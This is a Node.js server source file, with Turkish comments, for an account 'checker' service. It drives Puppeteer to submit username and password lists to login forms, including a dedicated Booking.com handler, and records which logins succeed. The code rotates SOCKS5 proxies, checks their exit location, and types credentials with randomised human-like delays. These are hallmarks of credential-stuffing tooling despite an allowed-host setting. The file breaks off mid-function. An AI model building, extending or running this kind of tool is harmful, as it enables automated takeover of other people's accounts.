require('dotenv').config();
const express = require('express');
const path = require('path');
const os = require('os');
const fs = require('fs').promises;
const crypto = require('crypto');
const https = require('https');
const net = require('net');

process.env.PUPPETEER_CACHE_DIR = process.env.PUPPETEER_CACHE_DIR || path.join(__dirname, '.cache', 'puppeteer');

const puppeteer = require('puppeteer');
const { MongoClient, ObjectId } = require('mongodb');
const JSZip = require('jszip');
const ProxyChain = require('proxy-chain');
const { SocksProxyAgent } = require('socks-proxy-agent');

// ========== PROXY POOL ==========
const ProxyPool = require('./proxy-pool');
const proxyPool = new ProxyPool();
const defaultProxyConfig = require('./proxy-config');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';
const IS_PRODUCTION = process.env.NODE_ENV === 'production';
const CHECK_PROGRESS_DELAY_MS = Number(process.env.CHECK_PROGRESS_DELAY_MS || 1000);
const CHECK_ATTEMPT_DELAY_MS = Number(process.env.CHECK_ATTEMPT_DELAY_MS || 2000);
const CHECK_NAVIGATION_TIMEOUT_MS = Number(process.env.CHECK_NAVIGATION_TIMEOUT_MS || 60000);
const CHECK_POST_SUBMIT_WAIT_MS = Number(process.env.CHECK_POST_SUBMIT_WAIT_MS || 8000);
const PROXY_CHECK_TIMEOUT_MS = Number(process.env.PROXY_CHECK_TIMEOUT_MS || 12000);

const RESULTS_FILE = process.env.RESULTS_FILE || path.join(os.tmpdir(), 'panelcheckers-results.json');
const SESSION_COOKIE = 'panelcheckers_session';
const SESSION_SECRET = process.env.SESSION_SECRET || 'panelcheckers-dev-secret-change-me';

// ==================== PERMISSIONS ====================
const PERMISSIONS = Object.freeze({
    CHECKER_RUN: 'checker.run',
    CHECKER_RESULTS: 'checker.results',
    PROXY_MANAGE: 'proxy.manage',
    LISTS_GROUP: 'lists.group',
    HISTORY_OWN: 'history.own',
    HISTORY_ALL: 'history.all',
    USERS_MANAGE: 'users.manage',
    HOSTS_MANAGE: 'hosts.manage',
    SESSIONS_VIEW: 'sessions.view'
});

const PERMISSION_CATALOG = Object.freeze([
    { key: PERMISSIONS.CHECKER_RUN, label: 'Checker çalıştırma' },
    { key: PERMISSIONS.CHECKER_RESULTS, label: 'Checker sonuçlarını görme/indirme' },
    { key: PERMISSIONS.PROXY_MANAGE, label: 'Proxy yönetimi' },
    { key: PERMISSIONS.LISTS_GROUP, label: 'Liste gruplama' },
    { key: PERMISSIONS.HISTORY_OWN, label: 'Kendi geçmişini görme' },
    { key: PERMISSIONS.HISTORY_ALL, label: 'Tüm kullanıcı geçmişini görme' },
    { key: PERMISSIONS.USERS_MANAGE, label: 'Kullanıcı yönetimi' },
    { key: PERMISSIONS.HOSTS_MANAGE, label: 'Yetkili domain yönetimi' },
    { key: PERMISSIONS.SESSIONS_VIEW, label: 'Oturum loglarını görme' }
]);

const ALL_PERMISSIONS = Object.freeze(PERMISSION_CATALOG.map(item => item.key));
const DEFAULT_USER_PERMISSIONS = Object.freeze([
    PERMISSIONS.CHECKER_RUN,
    PERMISSIONS.CHECKER_RESULTS,
    PERMISSIONS.PROXY_MANAGE,
    PERMISSIONS.LISTS_GROUP,
    PERMISSIONS.HISTORY_OWN
]);

const BROWSER_HEADLESS = process.env.BROWSER_HEADLESS
    ? !['0', 'false', 'no'].includes(String(process.env.BROWSER_HEADLESS).toLowerCase())
    : IS_PRODUCTION ? 'new' : false;
const BROWSER_USER_DATA_ROOT = process.env.BROWSER_USER_DATA_ROOT || path.join(os.tmpdir(), 'panelcheckers-browser-profiles');

app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

let clients = [];
let db = null;
let mongoStatus = { configured: false, attempted: false, connected: false, error: null };

// ==================== CACHE ====================
let cachedSettings = null;
let settingsCacheTime = 0;
const CACHE_TTL = 1000;

// ==================== TEST DURDURMA ====================
let activeTests = new Map();

async function getSettings() {
    if (!db) return null;
    
    const now = Date.now();
    if (cachedSettings && (now - settingsCacheTime) < CACHE_TTL) {
        return cachedSettings;
    }
    
    try {
        const settings = await db.collection('settings').findOne({ _id: 'system' });
        if (settings) {
            cachedSettings = settings;
            settingsCacheTime = now;
            console.log('📦 Settings cache yenilendi:', settings.allowedHosts);
        }
        return settings;
    } catch (err) {
        console.error('Settings okuma hatası:', err);
        return cachedSettings;
    }
}

async function getProxyConfigs() {
    const settings = await getSettings();
    return settings?.proxyConfigs || [];
}

async function getAllowedHosts() {
    const settings = await getSettings();
    return settings?.allowedHosts || ['localhost', '127.0.0.1'];
}

async function getRootDomains() {
    const settings = await getSettings();
    return settings?.rootDomains || [];
}

async function isEnforceRootDomains() {
    const settings = await getSettings();
    return settings?.enforceRootDomains || false;
}

async function getProxyConfig(id) {
    const configs = await getProxyConfigs();
    return configs.find(p => p.id === id) || null;
}

// ==================== TEMEL FONKSİYONLAR ====================
function normalizeHost(value) {
    const raw = String(value || '').trim().toLowerCase();
    if (!raw) return '';
    try {
        const parsed = new URL(raw.includes('://') ? raw : `https://${raw}`);
        return parsed.hostname.replace(/^www\./, '');
    } catch {
        return raw
            .replace(/^https?:\/\//, '')
            .split('/')[0]
            .split(':')[0]
            .replace(/^www\./, '')
            .replace(/[^a-z0-9.-]/g, '');
    }
}

function normalizeUsername(username) {
    return String(username || '').trim().toLowerCase();
}

function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
    const hash = crypto.pbkdf2Sync(String(password), salt, 120000, 32, 'sha256').toString('hex');
    return `${salt}:${hash}`;
}

function verifyPassword(password, storedHash) {
    if (!storedHash || !storedHash.includes(':')) return false;
    const [salt, hash] = storedHash.split(':');
    const candidate = hashPassword(password, salt).split(':')[1];
    return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(candidate, 'hex'));
}

function normalizeRole(role) {
    return role === 'admin' ? 'admin' : 'user';
}

function normalizePermissions(permissions) {
    if (!Array.isArray(permissions)) return [];
    const allowed = new Set(ALL_PERMISSIONS);
    return [...new Set(permissions.map(String).filter(permission => allowed.has(permission)))];
}

function effectivePermissions(user) {
    if (normalizeRole(user && user.role) === 'admin') return [...ALL_PERMISSIONS];
    if (!Array.isArray(user && user.permissions)) return [...DEFAULT_USER_PERMISSIONS];
    return normalizePermissions(user.permissions);
}

function publicUser(user) {
    return {
        id: String(user._id),
        username: user.username,
        role: normalizeRole(user.role),
        active: user.active !== false,
        permissions: effectivePermissions(user),
        createdAt: user.createdAt || null,
        updatedAt: user.updatedAt || null,
        lastLoginAt: user.lastLoginAt || null
    };
}

function validateUsername(username) {
    const normalized = normalizeUsername(username);
    if (!/^[a-z0-9._-]{3,40}$/.test(normalized)) {
        return { ok: false, error: 'Kullanıcı adı 3-40 karakter olmalı; yalnızca harf, rakam, nokta, tire ve alt çizgi kullanılabilir.' };
    }
    return { ok: true, username: normalized };
}

function validatePassword(password, required = true) {
    const value = String(password || '');
    if (!value && !required) return { ok: true, password: '' };
    if (value.length < 8 || value.length > 128) {
        return { ok: false, error: 'Şifre 8-128 karakter olmalıdır.' };
    }
    return { ok: true, password: value };
}

function signValue(value) {
    return crypto.createHmac('sha256', SESSION_SECRET).update(value).digest('base64url');
}

function createSessionCookie(user) {
    const payload = Buffer.from(JSON.stringify({
        id: String(user._id),
        issuedAt: Date.now()
    })).toString('base64url');
    return `${payload}.${signValue(payload)}`;
}

function parseCookies(req) {
    return String(req.headers.cookie || '')
        .split(';')
        .map(part => part.trim())
        .filter(Boolean)
        .reduce((acc, part) => {
            const eq = part.indexOf('=');
            if (eq === -1) return acc;
            acc[part.slice(0, eq)] = decodeURIComponent(part.slice(eq + 1));
            return acc;
        }, {});
}

function getSessionUser(req) {
    const token = parseCookies(req)[SESSION_COOKIE];
    if (!token || !token.includes('.')) return null;
    const [payload, signature] = token.split('.');
    if (signature !== signValue(payload)) return null;
    try {
        return JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
    } catch {
        return null;
    }
}

async function requireAuth(req, res, next) {
    try {
        const session = getSessionUser(req);
        if (!session || !db || !ObjectId.isValid(session.id)) {
            return res.status(401).json({ error: 'Giriş gerekli.' });
        }
        const user = await db.collection('users').findOne({ _id: new ObjectId(session.id) });
        if (!user || user.active === false) {
            return res.status(401).json({ error: 'Kullanıcı hesabı aktif değil veya bulunamadı.' });
        }
        req.user = publicUser(user);
        next();
    } catch (err) {
        next(err);
    }
}

function requirePermission(permission) {
    return (req, res, next) => {
        if (req.user && req.user.permissions.includes(permission)) return next();
        return res.status(403).json({ error: `Bu işlem için yetkiniz yok: ${permission}` });
    };
}

function safeFileToken(value, fallback = 'anon') {
    return String(value || fallback).replace(/[^a-zA-Z0-9_-]/g, '');
}

function getResultsFile(userId, runId = 'current') {
    const suffix = String(userId || 'anon').replace(/[^a-zA-Z0-9_-]/g, '');
    const runSuffix = safeFileToken(runId, 'current');
    return RESULTS_FILE.replace(/\.json$/i, `-${suffix}-${runSuffix}.json`);
}

function maskPassword(password) {
    const value = String(password || '');
    if (!value) return '';
    if (value.length <= 2) return '*'.repeat(value.length);
    return `${value.slice(0, 1)}${'*'.repeat(Math.max(value.length - 2, 2))}${value.slice(-1)}`;
}

function getDomainFromUrl(value) {
    try {
        return new URL(normalizeUrl(value)).hostname.replace(/^www\./, '').toLowerCase();
    } catch {
        return '';
    }
}

async function isAllowedCheckUrl(value) {
    try {
        const url = new URL(normalizeUrl(value));
        const host = normalizeHost(url.hostname);
        const hosts = await getAllowedHosts();
        
        // Ana domain kontrolü (alt domainleri de kontrol et)
        const isAllowed = hosts.some(allowedHost => {
            if (host === allowedHost) return true;
            if (host.endsWith(`.${allowedHost}`)) return true;
            return false;
        });
        
        console.log(`🔍 Host kontrol: ${host} -> İzinli mi? ${isAllowed} (${hosts.join(', ')})`);
        
        return isAllowed;
    } catch {
        return false;
    }
}

function isLocalAllowedHost(host) {
    return host === 'localhost' || host === '127.0.0.1' || host === '::1';
}

function isHostUnderRoot(host, root) {
    return host === root || host.endsWith(`.${root}`);
}

async function validateAllowedHostCandidate(input) {
    const host = normalizeHost(input);
    if (!host) return { ok: false, error: 'Host boş olamaz.' };
    if (!/^(localhost|(\d{1,3}\.){3}\d{1,3}|[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)*)$/.test(host)) {
        return { ok: false, error: 'Geçerli bir host girin. Örnek: login.sirket.com' };
    }
    if (isLocalAllowedHost(host) || isPrivateIp(host)) {
        const hosts = await getAllowedHosts();
        if (hosts.includes(host)) return { ok: true, host };
        return { ok: false, error: 'Yerel veya özel ağ hostları yalnızca yetkili hostlar listesinde olabilir.' };
    }
    const rootDomains = await getRootDomains();
    if (rootDomains.some(root => isHostUnderRoot(host, root))) return { ok: true, host };
    if (!(await isEnforceRootDomains())) return { ok: true, host };
    return {
        ok: false,
        error: rootDomains.length
            ? `Host izinli kök domain altında değil. İzinli kökler: ${rootDomains.join(', ')}`
            : 'Root domain zorunluluğu açık. Önce kök domain ekleyin.'
    };
}

function parseAllowedHostInputs(body) {
    const values = [];
    if (Array.isArray(body && body.hosts)) values.push(...body.hosts);
    if (body && body.host) values.push(body.host);
    return values
        .flatMap(value => String(value || '').split(/[\n,;]+/))
        .map(value => value.trim())
        .filter(Boolean);
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function isPrivateIp(host) {
    if (!net.isIP(host)) return false;
    if (host === '::1') return true;
    if (host.includes(':')) {
        const normalized = host.toLowerCase();
        return normalized.startsWith('fc') || normalized.startsWith('fd') || normalized.startsWith('fe8')
            || normalized.startsWith('fe9') || normalized.startsWith('fea') || normalized.startsWith('feb');
    }
    const parts = host.split('.').map(Number);
    return parts[0] === 10
        || parts[0] === 127
        || (parts[0] === 169 && parts[1] === 254)
        || (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31)
        || (parts[0] === 192 && parts[1] === 168);
}

function parseSocksProxy(input) {
    const raw = String(input || '').trim();
    if (!raw) throw new Error('SOCKS5 proxy connection string gerekli.');

    let parsed;
    try {
        parsed = new URL(raw.includes('://') ? raw : `socks5://${raw}`);
    } catch {
        throw new Error('Geçersiz proxy connection string.');
    }

    if (!['socks5:', 'socks5h:'].includes(parsed.protocol)) {
        throw new Error('Yalnızca socks5:// veya socks5h:// proxy desteklenir.');
    }
    if (!parsed.hostname || !parsed.port) {
        throw new Error('Proxy host ve port içermelidir.');
    }
    if (['localhost', 'localhost.localdomain'].includes(parsed.hostname.toLowerCase()) || isPrivateIp(parsed.hostname)) {
        throw new Error('Yerel veya özel ağ proxy adresleri kabul edilmez.');
    }

    return {
        url: parsed.toString(),
        protocol: parsed.protocol.replace(':', ''),
        host: parsed.hostname,
        port: Number(parsed.port),
        username: decodeURIComponent(parsed.username || ''),
        hasPassword: Boolean(parsed.password)
    };
}

function buildProxyUrl(proxyConfig) {
    if (!proxyConfig || !proxyConfig.host) return null;
    let url = `socks5://`;
    if (proxyConfig.username) {
        url += `${encodeURIComponent(proxyConfig.username)}`;
        if (proxyConfig.password) {
            url += `:${encodeURIComponent(proxyConfig.password)}`;
        }
        url += `@`;
    }
    url += `${proxyConfig.host}:${proxyConfig.port}`;
    return url;
}

async function getActiveProxyConfig(userId) {
    const settings = await getSettings();
    if (!settings?.userProxySelections) return null;
    const proxyId = settings.userProxySelections[userId];
    if (!proxyId) return null;
    return getProxyConfig(proxyId);
}

async function getProxyUrlForUser(userId) {
    const config = await getActiveProxyConfig(userId);
    if (!config) return null;
    return buildProxyUrl(config);
}

async function lookupProxyGeo(proxyUrl) {
    const agent = new SocksProxyAgent(proxyUrl);
    return new Promise((resolve, reject) => {
        const request = https.get('https://ipwho.is/', {
            agent,
            timeout: PROXY_CHECK_TIMEOUT_MS,
            headers: {
                Accept: 'application/json',
                'User-Agent': 'PanelCheckers-ProxyVerifier/1.0'
            }
        }, response => {
            let body = '';
            response.setEncoding('utf8');
            response.on('data', chunk => {
                body += chunk;
                if (body.length > 128 * 1024) request.destroy(new Error('Proxy doğrulama cevabı çok büyük.'));
            });
            response.on('end', () => {
                if (response.statusCode < 200 || response.statusCode >= 300) {
                    reject(new Error(`Konum servisi HTTP ${response.statusCode} döndürdü.`));
                    return;
                }
                try {
                    const data = JSON.parse(body);
                    if (data.success === false || !data.ip) {
                        reject(new Error(data.message || 'Proxy çıkış IP bilgisi alınamadı.'));
                        return;
                    }
                    resolve({
                        ip: data.ip,
                        country: data.country || '',
                        countryCode: data.country_code || '',
                        region: data.region || '',
                        city: data.city || '',
                        postal: data.postal || '',
                        latitude: data.latitude ?? null,
                        longitude: data.longitude ?? null,
                        timezone: data.timezone && data.timezone.id ? data.timezone.id : ''
                    });
                } catch {
                    reject(new Error('Proxy konum servisi geçersiz cevap döndürdü.'));
                }
            });
        });
        request.on('timeout', () => request.destroy(new Error('Proxy bağlantısı zaman aşımına uğradı.')));
        request.on('error', reject);
    });
}

function getBrowserLaunchOptions(runId = 'manual', browserProxyUrl = '') {
    const userDataDir = path.join(BROWSER_USER_DATA_ROOT, safeFileToken(runId, 'manual'));
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-crash-reporter',
        '--disable-crashpad'
    ];
    if (browserProxyUrl) args.push(`--proxy-server=${browserProxyUrl}`);
    
    const executablePath = process.env.PUPPETEER_EXECUTABLE_PATH || 
                          '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
    
    return {
        headless: BROWSER_HEADLESS,
        slowMo: IS_PRODUCTION || BROWSER_HEADLESS ? 0 : 250,
        userDataDir,
        args,
        executablePath: executablePath
    };
}

async function runBrowserSmokeTest(browser) {
    const page = await browser.newPage();
    try {
        await page.goto('data:text/html,<form><input name="username"><input type="password"><button type="submit">Login</button></form>', {
            waitUntil: 'domcontentloaded',
            timeout: 5000
        });
        const hasForm = await page.$('input[name="username"]') && await page.$('input[type="password"]');
        if (!hasForm) throw new Error('Smoke test login form not found');
    } finally {
        await page.close().catch(() => {});
    }
}

function normalizeUrl(url) {
    url = url.trim();
    if (url.startsWith('//')) url = 'https:' + url;
    if (!url.startsWith('http')) url = 'https://' + url;
    return url;
}

// ==================== EVRENSEL FORM HANDLER ====================
class UniversalFormHandler {
    constructor(page) {
        this.page = page;
        this.formTypes = {
            STANDARD: 'standard',
            MODAL: 'modal',
            IFRAME: 'iframe',
            POPUP: 'popup',
            MULTI_STEP: 'multi_step',
            AJAX: 'ajax',
            REACT: 'react',
            VUE: 'vue',
            ANGULAR: 'angular',
            BOOKING: 'booking',
            CUSTOM: 'custom'
        };
    }

    // ========== BOOKING.COM ÖZEL HANDLER ==========
    async findBookingLoginForm() {
        try {
            // Booking.com login formu
            const form = await this.page.$('form[action*="sign-in"], form[data-testid="login-form"]');
            
            // Email input
            const userInput = await this.page.$('input[name="username"], input[name="email"], input[type="email"], input[data-testid="email-input"]');
            if (!userInput) return null;
            
            // Password input
            const passInput = await this.page.$('input[name="password"], input[type="password"], input[data-testid="password-input"]');
            if (!passInput) return null;
            
            // Submit butonu
            const submitBtn = await this.page.$('button[type="submit"], button[data-testid="login-submit"], button:has-text("Sign in"), button:has-text("Log in")');
            
            return {
                type: this.formTypes.BOOKING,
                form: form,
                inputs: { user: userInput, pass: passInput, submit: submitBtn }
            };
        } catch {
            return null;
        }
    }

    async findLoginForm() {
        // 1. Booking.com özel handler
        const bookingForm = await this.findBookingLoginForm();
        if (bookingForm) return bookingForm;

        // 2. Modal
        const modalForm = await this.findModalForm();
        if (modalForm) return modalForm;

        // 3. Iframe
        const iframeForm = await this.findIframeForm();
        if (iframeForm) return iframeForm;

        // 4. Popup
        const popupForm = await this.findPopupForm();
        if (popupForm) return popupForm;

        // 5. Multi-step
        const multiStepForm = await this.findMultiStepForm();
        if (multiStepForm) return multiStepForm;

        // 6. Standart
        const standardForm = await this.findStandardForm();
        if (standardForm) return standardForm;

        // 7. SPA
        const spaForm = await this.findSPAForm();
        if (spaForm) return spaForm;

        // 8. Custom
        const customForm = await this.findCustomForm();
        if (customForm) return customForm;

        throw new Error('Hiçbir login formu bulunamadı');
    }

    // ========== BOOKING ÖZEL DOLDURMA ==========
    async fillBookingForm(formInfo, username, password) {
        try {
            const { inputs } = formInfo;
            
            // Inputları temizle
            await this.page.evaluate((el) => {
                el.value = '';
                el.dispatchEvent(new Event('input', { bubbles: true }));
            }, inputs.user);
            
            // Kullanıcı adını yaz (gerçek kullanıcı gibi)
            await inputs.user.click({ clickCount: 3 });
            await inputs.user.press('Backspace');
            await this.page.waitForTimeout(200);
            
            for (const char of String(username)) {
                await inputs.user.type(char, { delay: 40 + Math.random() * 30 });
            }
            await this.page.waitForTimeout(300);
            
            // "Continue" butonu varsa tıkla
            const continueBtn = await this.page.$('button[type="submit"], button:has-text("Continue"), button:has-text("Next")');
            if (continueBtn) {
                await continueBtn.click();
                await this.page.waitForTimeout(2000);
            }
            
            // Şifre inputunu bul (sayfa değişmiş olabilir)
            let passInput = inputs.pass;
            const passInputExists = await this.page.$(input => input.type === 'password');
            if (!passInput || !(await this.page.evaluate(el => el.isConnected, passInput).catch(() => false))) {
                passInput = await this.page.$('input[type="password"], input[data-testid="password-input"]');
            }
            
            if (passInput) {
                await passInput.click({ clickCount: 3 });
                await passInput.press('Backspace');
                await this.page.waitForTimeout(200);
                
                for (const char of String(password)) {
                    await passInput.type(char, { delay: 40 + Math.random() * 30 });
                }
                await this.page.waitForTimeout(300);
                
                // Login butonu
                const loginBtn = await this.page.$('button[type="submit"], button:has-text("Sign in"), button:has-text("Log in"), button[data-testid="login-submit"]');
                if (loginBtn) {
                    await loginBtn.click();
                } else if (passInput) {
                    await passInput.press('Enter');
                }
            }
            
            return true;
        } catch (error) {
            console.error('Booking form doldurma hatası:', error);
            return false;
        }
    }

    async fillAndSubmit(formInfo, username, password) {
        // Booking.com özel
        if (formInfo.type === this.formTypes.BOOKING) {
            return await this.fillBookingForm(formInfo, username, password);
        }
        
        const { type, inputs, form, frame, page } = formInfo;

        try {
            if (inputs.user) await this.fillInput(inputs.user, username);
            if (inputs.pass) await this.fillInput(inputs.pass, password);

            if (type === this.formTypes.IFRAME && frame) {
                if (inputs.submit) await frame.click(inputs.submit);
                else if (inputs.pass) await frame.press(inputs.pass, 'Enter');
            } else if (type === this.formTypes.POPUP && page) {
                if (inputs.submit) await page.click(inputs.submit);
                else if (inputs.pass) await page.press(inputs.pass, 'Enter');
            } else if (type === this.formTypes.MULTI_STEP) {
                await this.fillInput(formInfo.userInput, username);
                await formInfo.nextBtn.click();
                await this.page.waitForTimeout(1000);
                const passInput = await this.page.$('input[type="password"]');
                if (passInput) {
                    await this.fillInput(passInput, password);
                    const finalSubmit = await this.page.$('button[type="submit"]');
                    if (finalSubmit) await finalSubmit.click();
                    else await passInput.press('Enter');
                }
            } else {
                if (inputs.submit) {
                    await this.page.evaluate(el => el.click(), inputs.submit);
                } else if (inputs.pass) {
                    await this.page.press(inputs.pass, 'Enter');
                } else if (form) {
                    await this.page.evaluate(el => el.submit(), form);
                }
            }

            return true;
        } catch (error) {
            console.error('Form doldurma hatası:', error);
            return false;
        }
    }

    async fillInput(input, value) {
        await this.page.evaluate((el, val) => {
            el.focus();
            el.value = val;
            const event = new Event('input', { bubbles: true });
            el.dispatchEvent(event);
            const changeEvent = new Event('change', { bubbles: true });
            el.dispatchEvent(changeEvent);
            el.blur();
        }, input, String(value));
        
        await input.click({ clickCount: 3 });
        await input.press('Backspace');
        await input.type(String(value), { delay: 20 });
    }

    // ========== DİĞER FORM BULMA METODLARI ==========
    async findModalForm() {
        try {
            const modalSelectors = [
                '.modal', '.modal-dialog', '.modal-content',
                '.popup', '.popup-content', '.dialog',
                '[role="dialog"]', '[role="modal"]',
                '.ant-modal', '.el-dialog', '.MuiModal',
                '.v-dialog', '.ui-modal', '.overlay',
                '#modal', '#popup'
            ];

            for (const selector of modalSelectors) {
                const modal = await this.page.$(selector);
                if (modal) {
                    const isVisible = await this.page.evaluate(el => {
                        const style = window.getComputedStyle(el);
                        return style.display !== 'none' && style.visibility !== 'hidden';
                    }, modal);

                    if (isVisible) {
                        const form = await this.page.$(`${selector} form, ${selector} [role="form"]`);
                        if (form) {
                            const inputs = await this.getFormInputs(form);
                            if (inputs.user && inputs.pass) {
                                return {
                                    type: this.formTypes.MODAL,
                                    form: form,
                                    inputs: inputs,
                                    container: modal
                                };
                            }
                        }
                    }
                }
            }
            return null;
        } catch { return null; }
    }

    async findIframeForm() {
        try {
            const frames = this.page.frames();
            for (const frame of frames) {
                if (frame === this.page.mainFrame()) continue;

                const inputs = await this.getFormInputsFromFrame(frame);
                if (inputs.user && inputs.pass) {
                    return {
                        type: this.formTypes.IFRAME,
                        frame: frame,
                        inputs: inputs,
                        form: await frame.$('form')
                    };
                }
            }
            return null;
        } catch { return null; }
    }

    async findPopupForm() {
        try {
            const pages = await this.page.browser().pages();
            const mainPage = this.page;
            
            for (const page of pages) {
                if (page === mainPage) continue;
                
                const isPopup = await page.evaluate(() => {
                    return window.opener !== null || window.name.includes('popup');
                }).catch(() => false);

                if (isPopup) {
                    const inputs = await this.getFormInputsFromPage(page);
                    if (inputs.user && inputs.pass) {
                        return {
                            type: this.formTypes.POPUP,
                            page: page,
                            inputs: inputs
                        };
                    }
                }
            }
            return null;
        } catch { return null; }
    }

    async findMultiStepForm() {
        try {
            const step1Selectors = [
                '[data-step="1"]', '.step-1', '.step1',
                '[data-step="username"]', '[data-step="email"]'
            ];

            for (const selector of step1Selectors) {
                const step = await this.page.$(selector);
                if (step) {
                    const userInput = await step.$('input[type="text"], input[type="email"], input[name="username"], input[name="email"]');
                    if (userInput) {
                        const nextBtn = await step.$('button:not([type="button"]), [data-action="next"], .next-btn, .continue-btn');
                        if (nextBtn) {
                            return {
                                type: this.formTypes.MULTI_STEP,
                                step1: step,
                                userInput: userInput,
                                nextBtn: nextBtn
                            };
                        }
                    }
                }
            }
            return null;
        } catch { return null; }
    }

    async findStandardForm() {
        try {
            const forms = await this.page.$$('form');
            for (const form of forms) {
                const inputs = await this.getFormInputs(form);
                if (inputs.user && inputs.pass) {
                    return {
                        type: this.formTypes.STANDARD,
                        form: form,
                        inputs: inputs
                    };
                }
            }
            return null;
        } catch { return null; }
    }

    async findSPAForm() {
        try {
            const reactForm = await this.page.$('[data-testid*="login"], [data-testid*="signin"], .MuiFormControl-root');
            if (reactForm) {
                const inputs = await this.getFormInputs(reactForm);
                if (inputs.user && inputs.pass) {
                    return {
                        type: this.formTypes.REACT,
                        form: reactForm,
                        inputs: inputs
                    };
                }
            }

            const vueForm = await this.page.$('[data-v-*], .v-form, .v-card');
            if (vueForm) {
                const inputs = await this.getFormInputs(vueForm);
                if (inputs.user && inputs.pass) {
                    return {
                        type: this.formTypes.VUE,
                        form: vueForm,
                        inputs: inputs
                    };
                }
            }

            const angularForm = await this.page.$('[ng-form], [form-group], .ng-valid');
            if (angularForm) {
                const inputs = await this.getFormInputs(angularForm);
                if (inputs.user && inputs.pass) {
                    return {
                        type: this.formTypes.ANGULAR,
                        form: angularForm,
                        inputs: inputs
                    };
                }
            }

            return null;
        } catch { return null; }
    }

    async findCustomForm() {
        try {
            const customSelectors = [
                '.login-form', '.signin-form', '.auth-form',
                '.login-panel', '.signin-panel', '.auth-panel',
                '.user-login', '.member-login', '.account-login',
                '.login-container', '.signin-container'
            ];

            for (const selector of customSelectors) {
                const container = await this.page.$(selector);
                if (container) {
                    const inputs = await this.getFormInputs(container);
                    if (inputs.user && inputs.pass) {
                        return {
                            type: this.formTypes.CUSTOM,
                            container: container,
                            inputs: inputs
                        };
                    }
                }
            }

            const allInputs = await this.page.$$('input');
            let userInput = null;
            let passInput = null;

            for (const input of allInputs) {
                const type = await this.page.evaluate(el => el.type, input);
                if (type === 'password') {
                    passInput = input;
                } else if (['text', 'email', 'tel', 'number'].includes(type)) {
                    if (!userInput) {
                        userInput = input;
                    }
                }
            }

            if (userInput && passInput) {
                return {
                    type: this.formTypes.CUSTOM,
                    inputs: { user: userInput, pass: passInput },
                    form: null
                };
            }

            return null;
        } catch { return null; }
    }

    async getFormInputs(container) {
        const inputs = { user: null, pass: null, submit: null };

        try {
            const passInputs = await container.$$('input[type="password"]');
            if (passInputs.length > 0) {
                inputs.pass = passInputs[0];
            }

            const textInputs = await container.$$('input[type="text"], input[type="email"], input[type="tel"], input[type="number"], input:not([type])');
            
            let bestInput = null;
            for (const input of textInputs) {
                const name = await this.page.evaluate(el => el.name || '', input);
                const id = await this.page.evaluate(el => el.id || '', input);
                const placeholder = await this.page.evaluate(el => el.placeholder || '', input);
                const combined = `${name} ${id} ${placeholder}`.toLowerCase();
                if (/(user|login|email|mail|username)/.test(combined)) {
                    bestInput = input;
                    break;
                }
            }

            if (!bestInput && textInputs.length > 0) {
                bestInput = textInputs[0];
            }

            inputs.user = bestInput;

            const submitBtns = await container.$$('button[type="submit"], input[type="submit"], button:not([type]), [role="button"]');
            for (const btn of submitBtns) {
                const text = await this.page.evaluate(el => el.innerText || el.value || '', btn);
                if (/(login|giriş|sign in|log in|submit)/i.test(text)) {
                    inputs.submit = btn;
                    break;
                }
            }

            if (!inputs.submit && submitBtns.length > 0) {
                inputs.submit = submitBtns[0];
            }

            return inputs;
        } catch { return inputs; }
    }

    async getFormInputsFromFrame(frame) {
        try {
            const inputs = { user: null, pass: null, submit: null };
            const passInputs = await frame.$$('input[type="password"]');
            if (passInputs.length > 0) inputs.pass = passInputs[0];
            const textInputs = await frame.$$('input[type="text"], input[type="email"]');
            if (textInputs.length > 0) inputs.user = textInputs[0];
            const submitBtns = await frame.$$('button[type="submit"], input[type="submit"]');
            if (submitBtns.length > 0) inputs.submit = submitBtns[0];
            return inputs;
        } catch { return { user: null, pass: null, submit: null }; }
    }

    async getFormInputsFromPage(page) {
        try {
            const inputs = { user: null, pass: null, submit: null };
            const passInputs = await page.$$('input[type="password"]');
            if (passInputs.length > 0) inputs.pass = passInputs[0];
            const textInputs = await page.$$('input[type="text"], input[type="email"]');
            if (textInputs.length > 0) inputs.user = textInputs[0];
            const submitBtns = await page.$$('button[type="submit"], input[type="submit"]');
            if (submitBtns.length > 0) inputs.submit = submitBtns[0];
            return inputs;
        } catch { return { user: null, pass: null, submit: null }; }
    }
}


// ==================== VERIFY LOGIN SUCCESS (GÜNCELLENMİŞ - DETAYLI HATA) ====================
async function verifyLoginSuccess(page, originalUrl) {
    const currentUrl = page.url();
    const urlChanged = currentUrl !== originalUrl;
    
    // ========== BOOKING.COM ÖZEL KONTROL ==========
    if (currentUrl.includes('booking.com')) {
        const bookingCheck = await page.evaluate(() => {
            // Tüm hata mesajlarını bul
            const errorSelectors = [
                '.error', '.alert', '[role="alert"]', 
                '.alert-danger', '.alert-error',
                '[data-testid="error-message"]',
                '.error-message', '.field-error',
                '.invalid-feedback', '.form-error'
            ];
            
            let errorMessages = [];
            for (const selector of errorSelectors) {
                const elements = document.querySelectorAll(selector);
                for (const el of elements) {
                    const text = el.innerText || el.textContent || '';
                    if (text.trim()) {
                        errorMessages.push(text.trim());
                    }
                }
            }
            
            // Gizli hata mesajları (Booking.com spesifik)
            const hiddenErrors = [];
            const errorDivs = document.querySelectorAll('[class*="error"], [class*="Error"], [class*="alert"], [class*="Alert"]');
            for (const div of errorDivs) {
                const text = div.innerText || div.textContent || '';
                if (text.trim() && !errorMessages.includes(text.trim())) {
                    hiddenErrors.push(text.trim());
                }
            }
            
            // Booking.com özel: "Something went wrong" mesajları
            const bodyText = document.body ? document.body.innerText : '';
            const title = document.title || '';
            const hasLoginForm = !!document.querySelector('input[type="password"], input[name="password"]');
            const hasDashboard = !!document.querySelector('[data-testid="header-profile-menu"], .user-menu, .profile-icon, a[href*="account"], a[href*="profile"]');
